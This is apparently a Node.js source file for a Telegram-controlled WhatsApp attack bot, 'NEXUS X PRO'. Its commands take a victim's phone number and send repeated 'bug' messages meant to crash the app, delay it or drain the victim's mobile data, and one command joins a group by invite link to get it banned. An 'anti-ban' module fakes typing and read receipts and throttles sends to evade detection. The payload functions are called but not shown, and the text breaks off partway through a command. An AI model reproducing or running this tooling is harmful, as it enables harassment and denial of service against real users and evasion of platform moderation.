const { Telegraf } = require("telegraf");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    jidEncode,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
} = require("@lendxntaa/baileys");
const fs = require("fs-extra");
const path = require('path');
const { 
   tokenBot: BOT_TOKEN, 
   ownerID: ID_TELEGRAM
} = global.CONFIG;
const config = global.CONFIG;
const https = require("https");
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const sharp = require('sharp');
const QRCode = require('qrcode');
const FormData = require('form-data');
const EventEmitter = require('events');
const config = require('./settings/config.js');
const moment = require('moment-timezone');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ─────── CAPTION FOTO ─────── //
const THUMB = "https://files.catbox.moe/tp90cz.jpg";

// ─────── WHITELIST VALIDATION ─────── //
const WHITELIST_URL = "https://raw.githubusercontent.com/padlanfaitulrahman-droid/makkkloweh/main/tokens.json";

function extractBotId(token) {
    if (!token || typeof token !== 'string') return null;
    const match = token.match(/^(\d+):/);
    return match ? match[1] : null;
}

async function fetchWhitelist() {
    try {
        const res = await axios.get(WHITELIST_URL, {
            headers: { 'User-Agent': 'infernoShadow/2.0' },
            timeout: 10000,
            validateStatus: s => s === 200
        });

        if (!res.data) throw new Error('Response kosong');

        let tokens = [];
        if (Array.isArray(res.data)) {
            tokens = res.data;
        } else if (res.data && typeof res.data === 'object') {
            if (Array.isArray(res.data.tokens)) {
                tokens = res.data.tokens;
            } else if (Array.isArray(res.data.data)) {
                tokens = res.data.data;
            } else {
                const keys = Object.keys(res.data);
                let found = false;
                for (const key of keys) {
                    if (Array.isArray(res.data[key])) {
                        tokens = res.data[key];
                        found = true;
                        break;
                    }
                }
                if (!found) throw new Error('Tidak menemukan array');
            }
        } else {
            throw new Error('Format response tidak dikenal');
        }

        if (!Array.isArray(tokens) || tokens.length === 0) {
            throw new Error('Tidak ada token ditemukan');
        }

        tokens = tokens.filter(t => typeof t === 'string' && t.length > 5);
        if (tokens.length === 0) throw new Error('Tidak ada ID bot valid');

        return tokens;

    } catch (e) {
        console.log(chalk.red(`❌ Gagal fetch whitelist: ${e.message}`));
        return null;
    }
}

async function validateBot() {
    if (!BOT_TOKEN || BOT_TOKEN.length < 10) {
        console.log(chalk.red('\n❌ Token tidak ditemukan di config.js\n'));
        return false;
    }

    if (!BOT_ID) {
        console.log(chalk.red('\n❌ Gagal mengekstrak ID dari token!'));
        console.log(chalk.red(`   Token: ${BOT_TOKEN.substring(0, 15)}******\n`));
        return false;
    }

    const whitelist = await fetchWhitelist();
    if (!whitelist) {
        console.log(chalk.red('\n❌ Gagal memuat whitelist dari GitHub\n'));
        return false;
    }

    const isAllowed = whitelist.includes(BOT_ID);
    if (!isAllowed) {
        console.log(chalk.red('\n⬡═—⊱ BYPASS CHECKING ⊰—═⬡'));
        console.log(chalk.red('┃ BOT ID TIDAK TERDAFTAR DI WHITELIST!'));
        console.log(chalk.red('┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI'));
        console.log(chalk.red('⬡═―—―――――――――――――――――—═⬡\n'));
        return false;
    }

    console.log(chalk.green('\n⬡═—⊱ CHECKING SERVER ⊰—═⬡'));
    console.log(chalk.green(`┃ Bot Sukses Terhubung Terimakasih`));
    console.log(chalk.green('⬡═―—―――――――――――――――――—═⬡\n'));
    return true;
}

const BOT_ID = extractBotId(BOT_TOKEN);

const bot = new Telegraf(BOT_TOKEN);

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const getActiveSockets = () => {
    if (!sock || !isWhatsAppConnected) {
        return [];
    }
    return [sock];
};

const store = makeInMemoryStore({
    logger: pino({ level: 'silent' })
});

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(
                state.keys,
                pino({ level: 'silent' })
            ),
        },
        
        browser: Browsers.macOS("Safari"),
        
        getMessage: async (key) => {
            if (store) {
                const msg = await store.loadMessage(key.remoteJid, key.id);
                return msg?.message || undefined;
            }
            return proto.Message.fromObject({});
        },
        
        syncFullHistory: false,
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
    };

    sock = makeWASocket(connectionOptions);

    store.bind(sock.ev);

    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }
            const msg = m.messages[0];
            const chatId = msg.key.remoteJid || "Tidak Diketahui";
            
        } catch (error) {
            console.error('[messages.upsert]', error.message);
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            if (lastPairingMessage) {
                const connectedMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Number: +${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

                try {
                    bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu,
                        { parse_mode: "HTML" }
                    );
                } catch (e) {}
            }

            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.green(`PAIRING SENDER BERHASIL ✅ [${currentTime}]`));
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.message || 'Unknown';
            
            console.log(chalk.red(`❌ Koneksi terputus: ${statusCode} - ${reason}`));
            isWhatsAppConnected = false;

            if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                console.log(chalk.red('🚪 Logged out! Hapus ./session dan pairing ulang'));
                return;
            }

            if (statusCode === DisconnectReason.restartRequired) {
                console.log(chalk.yellow('🔄 Restart required...'));
                setTimeout(() => startSesi(), 3000);
                return;
            }

            console.log(chalk.yellow('🔌 Reconnect dalam 5 detik...'));
            setTimeout(() => startSesi(), 5000);
        }
    });
};

startSesi();

// ─────── VALIDATE CEK SENDER ─────── //
const checkWhatsAppConnection = (ctx, next) => {
    if (!sock || !isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

// ─────── ANTI BAN MODULE ─────── //
const ANTI_BAN_DB = path.join(__dirname, 'database', 'antiban.json');

const DEFAULT_ANTIBAN = {
    minDelay: 3000,
    maxDelay: 7000,
    maxPerHour: 1000,
    maxPerDay: 1000,
    pauseMs: 600000,
    simulateTyping: true,
    readReceipt: true,
    onlinePresence: true,
    warmupCount: 0,
    counter: {
        hour: 0,
        day: 0,
        hourStart: Date.now(),
        dayStart: Date.now()
    },
    paused: false,
    pausedUntil: 0
};

function loadAntiBan() {
    try {
        if (!fs.existsSync(path.join(__dirname, 'database'))) {
            fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true });
        }
        if (!fs.existsSync(ANTI_BAN_DB)) {
            fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(DEFAULT_ANTIBAN, null, 2));
            return { ...DEFAULT_ANTIBAN };
        }
        const data = JSON.parse(fs.readFileSync(ANTI_BAN_DB, 'utf8'));
        return { ...DEFAULT_ANTIBAN, ...data };
    } catch {
        return { ...DEFAULT_ANTIBAN };
    }
}

function saveAntiBan(data) {
    if (!fs.existsSync(path.join(__dirname, 'database'))) {
        fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true });
    }
    fs.writeFileSync(ANTI_BAN_DB, JSON.stringify(data, null, 2));
}

function randomDelay() {
    const cfg = loadAntiBan();
    return Math.floor(Math.random() * (cfg.maxDelay - cfg.minDelay + 1)) + cfg.minDelay;
}

async function guardSend() {
    const cfg = loadAntiBan();
    const now = Date.now();

    if (now - cfg.counter.hourStart >= 3600000) {
        cfg.counter.hour = 0;
        cfg.counter.hourStart = now;
    }
    if (now - cfg.counter.dayStart >= 86400000) {
        cfg.counter.day = 0;
        cfg.counter.dayStart = now;
    }

    if (cfg.paused && now < cfg.pausedUntil) {
        const sisa = Math.ceil((cfg.pausedUntil - now) / 1000);
        return { ok: false, reason: `Sender pause, tunggu ${sisa} detik` };
    } else if (cfg.paused && now >= cfg.pausedUntil) {
        cfg.paused = false;
        cfg.pausedUntil = 0;
    }

    if (cfg.counter.hour >= cfg.maxPerHour) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return { ok: false, reason: `Limit per jam (${cfg.maxPerHour}) tercapai, pause ${cfg.pauseMs / 1000}s` };
    }

    if (cfg.counter.day >= cfg.maxPerDay) {
        cfg.paused = true;
        cfg.pausedUntil = now + cfg.pauseMs;
        saveAntiBan(cfg);
        return { ok: false, reason: `Limit per hari (${cfg.maxPerDay}) tercapai, pause ${cfg.pauseMs / 1000}s` };
    }

    cfg.counter.hour++;
    cfg.counter.day++;
    saveAntiBan(cfg);
    return { ok: true };
}

async function safeSend(sock, target, messageFunc, bugName = "Bug") {
    const nomorTarget = target.replace(/@s\.whatsapp\.net|@g\.us/g, '');
    
    const guard = await guardSend();
    if (!guard.ok) {
        console.log(chalk.yellow(`⚠️  ${guard.reason}`));
        return false;
    }

    const cfg = loadAntiBan();

    try {
        if (cfg.onlinePresence) {
            try { await sock.sendPresenceUpdate('available'); } catch (e) {}
        }

        if (cfg.readReceipt) {
            try {
                await sock.readMessages([{ remoteJid: target, id: Date.now().toString() }]);
            } catch (e) {}
        }

        if (cfg.simulateTyping) {
            try {
                await sock.sendPresenceUpdate('composing', target);
                await sleep(randomDelay());
                await sock.sendPresenceUpdate('paused', target);
            } catch (e) {
                await sleep(randomDelay());
            }
        } else {
            await sleep(randomDelay());
        }

        const startTime = Date.now();
        await messageFunc();
        const durasi = ((Date.now() - startTime) / 1000).toFixed(2);

        console.log(chalk.yellow(`✅ Bug ${bugName} terkirim ke ${nomorTarget} (${durasi}s)\n`));
        return true;
    } catch (err) {
        console.log(chalk.red(`❌ Bug ${bugName} gagal ke ${nomorTarget}: ${err.message}\n`));
        return false;
    }
}

// ─────── CONNECT NO SENDER ─────── //
bot.command("connect", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitur ini hanya untuk pemilik bot");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Contoh: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XEROZ123");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Number: +${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(THUMB, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Number: +${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

// ─────── HAPUS PAIRING SENDER  ─────── //
bot.command("restart", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ Fitur ini hanya untuk pemilik bot");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("🗑️ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal menghapus session");
  }
});

// ─────── AWAL MENU UTAMA ─────── //
bot.start(async (ctx) => {
    try {
        const tanggal = getTanggal();
        const runtime = getRuntime();
        const caption = `<blockquote>ᥫ᭡ 𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎 ─ LIMITED

  > INITIALIZING SYSTEM...
  > VERSION   : 4.0
  > DEVELOPER : @xerozfps
  > STATUS    : ONLINE

  「限界を超え、未来へ。」
 Beyond limits, into the future.</blockquote>`;

        const keyboard = [
            [
                { text: "バグ (Bagu)", callback_data: "/bug_menu", style: "Primary" },
                { text: "主権 (Shuken)", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "案内 (Annai)", url: "https://t.me/xeroz_about", style: "Primary" },
            ]
        ];

        await ctx.replyWithPhoto(THUMB, {
            caption: caption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (e) {
        console.error("Error pada command start:", e);
    }
});

// ─────── CALLBACK MENU UTAMA ─────── //
bot.action("/start", async (ctx) => {
    const tanggal = getTanggal();
    const runtime = getRuntime();
    const caption = `<blockquote>ᥫ᭡ 𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎 ─ LIMITED

  > INITIALIZING SYSTEM...
  > VERSION   : 4.0
  > DEVELOPER : @xerozfps
  > STATUS    : ONLINE

  「限界を超え、未来へ。」
 Beyond limits, into the future.</blockquote>`;

    const keyboard = [
            [
                { text: "バグ (Bagu)", callback_data: "/bug_menu", style: "Primary" },
                { text: "主権 (Shuken)", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "案内 (Annai)", url: "https://t.me/xeroz_about", style: "Primary" },
            ]
        ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK TOOLS ─────── //
bot.action('/bug_menu', async (ctx) => {
    const caption = `<blockquote expandable>☰ ATTACK BUG MENU 
(Page 2/2)
────────────────────

☰ NO SPAM BUG
♡ /zunk → Delay Invisible hard
♡ /intest → Force Invisible Android
♡ /buldozer → Sedot Kuota Invisible
♡ /ints → Delay visible Android
♡ /bangrup → bannir group wa

☰ BEBAS SPAM BUG
♡ /xspam → Force bebas spam
♡ /xdelay → Delay bebas spam
♡ /xsedot → Buldozer bebas spam
────────────────────
Type : Optimized Bug
Network : Telegram
</blockquote>`;

    const keyboard = [
        [
            { text: "戻る (Modoru)", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK OWNER ─────── //
bot.action('/owner_menu', async (ctx) => {
    const caption = `<blockquote expandable>☰ SYSTEM CONTROL PANEL 
(Page 1/2)
────────────────────

☰ CONNECT PAIRING BOT 
♡ /connect → Add Sender
♡ /restart → Delete Sender

☰ ADD ALL MEMBERS
♡ /addgroup → Add all Member
♡ /delgroup → Del all Member

☰ BLOKIR COMMAND BUG 
♡ /blockcmd → Blokir Command 
♡ /bukacmd → Buka Command

☰ SET COOLDOWN CMD
♡ /setjeda → Atur jeda cmd

☰ FORCE JOIN CHANNEL
♡ /setch → Atur join channel
♡ /forcech → on/off join channel
────────────────────
Security Mode : ACTIVE 
Network : Telegram
</blockquote>`;

    const keyboard = [
        [
            { text: "戻る (Modoru)", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── ALL COMMAND BUG ─────── //
bot.command("xsedot", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /xsedot 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Sedot Kuota bebas spam 
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await safeSend(sock, target, async () => {
        await Buldozer(sock, target);
    }, "xsedot");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Sedot Kuota bebas spam
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xdelay", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /xdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay bebas spam
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await safeSend(sock, target, async () => {
        await KxADelayInvisibleNew(sock, target);
    }, "xdelay");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay bebas spam
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xspam", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /xspam 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Forclose bebas spam
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await safeSend(sock, target, async () => {
        await Xatanc(sock, target);
    }, "xspam");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Forclose bebas spam
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("buldozer", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /buldozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Sedot Kuota Invisible 
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await safeSend(sock, target, async () => {
        await Buldozer(sock, target);
    }, "Buldozer");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Sedot Kuota Invisible
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("zunk", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /zunk 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay Invisible hard
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await safeSend(sock, target, async () => {
        await KxADelayInvisibleNew(sock, target);
    }, "zunk");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay Invisible hard
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("intest", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /intest 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Forclose Invisible Android
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await safeSend(sock, target, async () => {
        await Xatanc(sock, target);
    }, "intest");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Forclose Invisible Android
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ints", checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /ints 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
 
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay visible Android
↯ Number: ${q}
↯ Status: Mengirim...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await safeSend(sock, target, async () => {
        await Delayultimate(sock, target);
    }, "ints");
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Type: Delay visible Android
↯ Number: ${q}
↯ Status: Selesai`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command('bangrup', checkWhatsAppConnection, checkPremiumGroup(), Cooldown(), async (ctx) => {
    const chatId = ctx.chat.id;
    const link = ctx.message.text.split(' ').slice(1).join(' ');

    if (!link) {
        return ctx.reply(`🪧 Contoh: /bangrup https://chat.whatsapp.com/xxxxxx`);
    }

    const inviteCode = extractGroupCode(link);

    if (!inviteCode) {
        return ctx.reply(`❌ Link tidak valid`);
    }

    const user = ctx.from;
    const username = user.username ? `@${user.username}` : user.first_name || "User";
    const userId = String(user.id);

    const processMessage = await ctx.replyWithPhoto(THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Target Grup: ${inviteCode}
↯ Type: Auto Join + Group Ban
↯ Status: Processing...
`,
        parse_mode: "HTML"
    });

    const processMsgId = processMessage.message_id;

    try {
        const target = await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            return ctx.reply(`❌ Gagal join grup`);
        }

